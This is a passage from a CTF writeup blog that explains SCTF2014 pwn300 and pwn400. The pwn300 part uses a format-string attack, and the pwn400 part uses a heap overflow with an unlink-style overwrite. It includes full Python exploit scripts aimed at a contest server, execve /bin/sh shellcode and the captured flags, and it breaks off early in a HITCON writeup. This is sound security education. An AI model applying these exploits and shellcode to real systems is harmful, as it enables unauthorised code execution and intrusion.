*MK\_FP(\_\_GS__, <span class="number">20</span>) ^ v2;</span><br><span class="line">  <span class="keyword">if</span> ( *MK\_FP(\_\_GS__, <span class="number">20</span>) != v2 )</span><br><span class="line">    \_\_stack\_chk_fail();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而且之前还很配合的把src的内容复制到栈里。。。这样就有机会对任意地址进行修改</p>
<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>利用格式化溢出漏洞可以对内存读取写入，所以可以利用pwn200的利用方式：读取PLT中__libc_main_start的地址，通过libc.so计算system的地址写入程序之后可能会用到的函数的GOT 通过调试发现输入buf的起点位于printf调用的第七个变量 读取.plt __libc_main_start的payload ‘x28x91x04x08%7$sn’ 接下来找一个接下来可能调用到的函数修改其PLT为system函数的地址。这个函数最好可以把“sh”作为参数放进去。于是我选择了memset函数 他在第二个功能中被用到，而且正好把src当参数调用，这样我们通过留言功能让src为”sh”就能调用system(“sh”)了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> \_\_cdecl fun2\_sub_80487B6()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input your message"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(src, <span class="number">0</span>, <span class="number">0x400</span>u);</span><br><span class="line">  <span class="keyword">return</span> readbuf\_sub\_804866D((<span class="keyword">int</span>)src, <span class="number">1024</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面是exploit，修改地址的时候利用了libformatstr库</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">SCTF2014 pwn300 exploit</span></span><br><span class="line"><span class="string">yuf4n</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> libformatstr <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">\<span class="comment"># io = zio('./pwn300',print_write=COLORED(REPR))</span></span><br><span class="line">io = zio((<span class="string">'218.2.197.248'</span>,<span class="number">10002</span>),print_write=COLORED(REPR))</span><br><span class="line"></span><br><span class="line">memset\_plt\_addr = <span class="number">0x08049130</span></span><br><span class="line">p = FormatStr()</span><br><span class="line">payload\_leak\_lib_main = <span class="string">'x28x91x04x08%7$sn'</span></span><br><span class="line"></span><br><span class="line">\<span class="comment"># read \_\_lib\_main_start plt</span></span><br><span class="line">io.read_until(<span class="string">'your choice:'</span>)</span><br><span class="line">io.write(<span class="string">'2n'</span>)</span><br><span class="line">io.read_until(<span class="string">'your message'</span>)</span><br><span class="line">io.write(payload\_leak\_lib_main)</span><br><span class="line">io.read_until(<span class="string">'your choice:'</span>)</span><br><span class="line">io.write(<span class="string">'3n'</span>)</span><br><span class="line">io.read_until(<span class="string">'message is:'</span>)</span><br><span class="line">buf = io.read(<span class="number">8</span>)</span><br><span class="line">buf = buf\[<span class="number">-4</span>:\]</span><br><span class="line">systemaddr = struct.unpack(<span class="string">'&lt;I'</span>,buf)\[<span class="number">0</span>\] + <span class="number">0x26050</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'SYSADDR'</span>,hex(systemaddr)</span><br><span class="line"></span><br><span class="line">\<span class="comment"># write  memset_plt</span></span><br><span class="line">p\[memset\_plt\_addr\] = systemaddr</span><br><span class="line">payload = p.payload(<span class="number">7</span>, start_len=<span class="number">0</span>) + <span class="string">'n'</span></span><br><span class="line">\<span class="comment"># io.gdb_hint()</span></span><br><span class="line">io.read_until(<span class="string">'your choice:'</span>)</span><br><span class="line">io.write(<span class="string">'2n'</span>)</span><br><span class="line">io.read_until(<span class="string">'your message'</span>)</span><br><span class="line">io.write(payload)</span><br><span class="line">io.write(<span class="string">'3n'</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment"># set src=sh and call memset</span></span><br><span class="line">io.read_until(<span class="string">'your choice:'</span>)</span><br><span class="line">io.write(<span class="string">'2n'</span>)</span><br><span class="line">io.read_until(<span class="string">'message'</span>)</span><br><span class="line">io.write(<span class="string">'shn'</span>)</span><br><span class="line">io.read_until(<span class="string">'your choice:'</span>)</span><br><span class="line">io.write(<span class="string">'2n'</span>)</span><br><span class="line">io.read_until(<span class="string">'message'</span>)</span><br><span class="line">io.write(<span class="string">'shn'</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
<p>flag SCTF{ZQzq2617}</p>
<h1 id="PWN400"><a href="#PWN400" class="headerlink" title="PWN400"></a>PWN400</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwn400: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE</span><br><span class="line">No RELRO        Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   pwn400</span><br></pre></td></tr></table></figure>
<p>这个NX都没有。</p>
<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>程序是一个类似便签的功能。 每个note是用malloc申请的，用双向链表链接起来，目测是某个同学的C语言小作业吧。。 3号功能可以显示note空间的的首地址。 在4号功能修改note的功能发现一个堆溢出的漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> \_\_cdecl fun4\_sub_8048D09(<span class="keyword">int</span> a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax@4</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@8</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// \[sp+28h\] \[bp-410h\]@1</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// \[sp+2Ch\] \[bp-40Ch\]@1</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// \[sp+42Ch\] \[bp-Ch\]@1</span></span><br><span class="line"></span><br><span class="line">  v5 = *MK\_FP(\_\_GS__, <span class="number">20</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x400</span>u);</span><br><span class="line">  v3 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"note title:"</span>, <span class="number">0xB</span>u);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>u);</span><br><span class="line">    <span class="keyword">while</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = <span class="built_in">strlen</span>(&amp;buf);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;buf, (<span class="keyword">const</span> <span class="keyword">char</span> *)(v3 + <span class="number">12</span>), v1) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v3 = *(_DWORD *)(v3 + <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"input content:"</span>, <span class="number">0xE</span>u);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>u);</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)(v3 + <span class="number">108</span>), &amp;buf);           <span class="comment">// exploit</span></span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"succeed!"</span>, <span class="number">8u</span>);</span><br><span class="line">    <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)(v3 + <span class="number">108</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"no notes"</span>, <span class="number">8u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = *MK\_FP(\_\_GS__, <span class="number">20</span>) ^ v5;</span><br><span class="line">  <span class="keyword">if</span> ( *MK\_FP(\_\_GS__, <span class="number">20</span>) != v5 )</span><br><span class="line">    \_\_stack\_chk_fail();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在5号功能删除note的功能发现一个类似dwrod shoot的漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> \_\_cdecl sub\_8048E99(<span class="keyword">int</span> a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ST28_4@8</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ST2C_4@8</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@10</span></span><br><span class="line">  __int32 ptr; <span class="comment">// \[sp+24h\] \[bp-24h\]@3</span></span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// \[sp+32h\] \[bp-16h\]@1</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// \[sp+36h\] \[bp-12h\]@1</span></span><br><span class="line">  __int16 v7; <span class="comment">// \[sp+3Ah\] \[bp-Eh\]@1</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// \[sp+3Ch\] \[bp-Ch\]@1</span></span><br><span class="line"></span><br><span class="line">  v8 = *MK\_FP(\_\_GS__, <span class="number">20</span>);</span><br><span class="line">  buf = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"note location:"</span>, <span class="number">0xE</span>u);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>);</span><br><span class="line">    ptr = strtol((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)ptr == ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)a1 == ptr )</span><br><span class="line">      &#123;</span><br><span class="line">        *(\_DWORD *)a1 = *(\_DWORD *)(*(_DWORD *)a1 + <span class="number">8</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(_DWORD *)(ptr + <span class="number">8</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v1 = *(_DWORD *)(ptr + <span class="number">8</span>);</span><br><span class="line">          v2 = *(_DWORD *)(ptr + <span class="number">4</span>);</span><br><span class="line">          *(_DWORD *)(v2 + <span class="number">8</span>) = v1;             <span class="comment">// dword shoot</span></span><br><span class="line">          *(_DWORD *)(v1 + <span class="number">4</span>) = v2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          *(\_DWORD *)(*(\_DWORD *)(ptr + <span class="number">4</span>) + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      write(<span class="number">1</span>, <span class="string">"succeed!nn"</span>, <span class="number">0xA</span>u);</span><br><span class="line">      <span class="built_in">free</span>((<span class="keyword">void</span> *)ptr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"no notes"</span>, <span class="number">8u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = *MK\_FP(\_\_GS__, <span class="number">20</span>) ^ v8;</span><br><span class="line">  <span class="keyword">if</span> ( *MK\_FP(\_\_GS__, <span class="number">20</span>) != v8 )</span><br><span class="line">    \_\_stack\_chk_fail();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例如ptr = &amp;note (note空间的基地址) 则可以进行 [ [ptr+4]+8 ] = [prt+8] [ [ptr+8]+4 ] = [ptr+4]</p>
<h2 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>思路是通过堆溢出漏洞可以覆盖到另外一个note的ptr+4 和 ptr+8。 之后利用这个dword shoot修改即将要调用的函数的plt到shellcode处。 shellcode前面要加一些nop，因为dword shoot的副作用会修改到shellcode。 具体操作：</p>
<ol>
<li>新建3个note，我把shellcode放在第三个note的content里</li>
<li>查看他们的地址</li>
<li>溢出第一个note</li>
<li>删除第二个note，通过dword shoot修改write函数的plt为shellcode位置（有试过修改其他函数的，发现修改write可以成功。）</li>
<li>程序在dword shoot之后就有一个write调用，即进入shellcode</li>
</ol>
<p>exploit如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">SCTF2014 pwn400 exploit</span></span><br><span class="line"><span class="string">yuf4n</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">\<span class="comment"># io = zio('./pwn400', print_write=COLORED(REPR), timeout=80000)</span></span><br><span class="line">io = zio((<span class="string">'218.2.197.248'</span>,<span class="number">10003</span>),print_write=COLORED(REPR))</span><br><span class="line">exit_plt = <span class="number">0x0804A46C</span></span><br><span class="line">free_plt =<span class="number">0x0804A450</span></span><br><span class="line">write_plt =<span class="number">0x0804A478</span></span><br><span class="line">shellcode = <span class="string">"x90"</span>*<span class="number">16</span>+<span class="string">"x31xc9xf7xe1xb0x0bx51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"</span></span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">io.write(<span class="string">'1n'</span>)</span><br><span class="line">io.read_until(<span class="string">'note title:'</span>)</span><br><span class="line">io.write(<span class="string">'1n'</span>)</span><br><span class="line">io.read_until(<span class="string">'note type:'</span>)</span><br><span class="line">io.write(<span class="string">'1n'</span>)</span><br><span class="line">io.read_until(<span class="string">'note content:'</span>)</span><br><span class="line">io.write(<span class="string">'1n'</span>)</span><br><span class="line">io.read_until(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line"></span><br><span class="line">io.write(<span class="string">'1n'</span>)</span><br><span class="line">io.read_until(<span class="string">'note title:'</span>)</span><br><span class="line">io.write(<span class="string">'2n'</span>)</span><br><span class="line">io.read_until(<span class="string">'note type:'</span>)</span><br><span class="line">io.write(<span class="string">'2n'</span>)</span><br><span class="line">io.read_until(<span class="string">'note content:'</span>)</span><br><span class="line">io.write(<span class="string">'2n'</span>)</span><br><span class="line">io.read_until(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line"></span><br><span class="line">io.write(<span class="string">'1n'</span>)</span><br><span class="line">io.read_until(<span class="string">'note title:'</span>)</span><br><span class="line">io.write(<span class="string">'3n'</span>)</span><br><span class="line">io.read_until(<span class="string">'note type:'</span>)</span><br><span class="line">io.write(<span class="string">'3n'</span>)</span><br><span class="line">io.read_until(<span class="string">'note content:'</span>)</span><br><span class="line">io.write(shellcode+<span class="string">'n'</span>)</span><br><span class="line">io.read_until(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line"></span><br><span class="line">io.write(<span class="string">'3n'</span>)</span><br><span class="line">io.read_until(<span class="string">'note title:'</span>)</span><br><span class="line">io.write(<span class="string">'3n'</span>)</span><br><span class="line">buf = io.read_until(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">addr_3 = buf\[buf.find(<span class="string">'location:0x'</span>)+len(<span class="string">'location:0x'</span>):buf.find(<span class="string">'location:0x'</span>)+len(<span class="string">'location:0x'</span>)+<span class="number">8</span>\]</span><br><span class="line"></span><br><span class="line">io.write(<span class="string">'3n'</span>)</span><br><span class="line">io.read_until(<span class="string">'note title:'</span>)</span><br><span class="line">io.write(<span class="string">'2n'</span>)</span><br><span class="line">buf = io.read_until(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">addr_2 = buf\[buf.find(<span class="string">'location:0x'</span>)+len(<span class="string">'location:0x'</span>):buf.find(<span class="string">'location:0x'</span>)+len(<span class="string">'location:0x'</span>)+<span class="number">8</span>\]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'1'</span>*<span class="number">0x100</span></span><br><span class="line">payload += <span class="string">'2222'</span></span><br><span class="line">\<span class="comment"># addr2</span></span><br><span class="line">payload += l32(int(addr_2,<span class="number">16</span>))</span><br><span class="line">\<span class="comment"># ptr+4</span></span><br><span class="line">payload += l32(write_plt<span class="number">-0x8</span>)</span><br><span class="line">\<span class="comment"># ptr+8</span></span><br><span class="line">payload += l32(int(addr_3,<span class="number">16</span>)+<span class="number">108</span>)</span><br><span class="line">payload += <span class="string">'efghijklmn'</span></span><br><span class="line"></span><br><span class="line">io.write(<span class="string">'4n'</span>)</span><br><span class="line">io.read_until(<span class="string">'title:'</span>)</span><br><span class="line">io.write(<span class="string">'1n'</span>)</span><br><span class="line">io.read_until(<span class="string">'content:'</span>)</span><br><span class="line">io.write(payload+<span class="string">'n'</span>)</span><br><span class="line">io.read_until(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line"></span><br><span class="line">io.write(<span class="string">'5n'</span>)</span><br><span class="line">\<span class="comment"># io.gdb_hint()</span></span><br><span class="line">io.read_until(<span class="string">'location:'</span>)</span><br><span class="line">io.write(addr_2+<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
<p>flag SCTF{2318540E78446A0E84EF69685092F0C3}</p>

                    
                        


                    
                    
                        <p>
                            <a
                                href="/writeups/sctf2014-pwn-writeups/#post-footer"
                                class="postShorten-excerpt_link link"
                                aria-label=""
                            >
                                Comment and share
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a
                            class="link-unstyled"
                            href="/writeups/hitcon-ctf-2014-rsbo-finger-rsaha-writeup/"
                            aria-label=": HITCON CTF 2014 rsbo,finger,rsaha writeup"
                        >
                            HITCON CTF 2014 rsbo,finger,rsaha writeup
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2014-09-04T14:45:12+08:00">
	
		    Sep 04, 2014
    	
    </time>
    
        <span>in </span>
        
    <a class="category-link" href="/categories/writeups/">writeups</a>


    
</div>

            </div>
            
                <div class="postShorten-content">
                    <h1 id="0x01-rsbo"><a href="#0x01-rsbo" class="headerlink" title="0x01 rsbo"></a>0x01 rsbo</h1><p>ELF 32-bit LSB  executable 栈有随机化且不能执行 静态分析程序,有调试信息 read_80_bytes能读入0x80即128bytes到&amp;v2，造成栈溢出 但输入后会进行一个混淆，所以使用0输入前0x60位，可覆盖过变量v5的位置，当随机替换v5处值与之前的0时即可退出循环 <img src="data:image/png;base64,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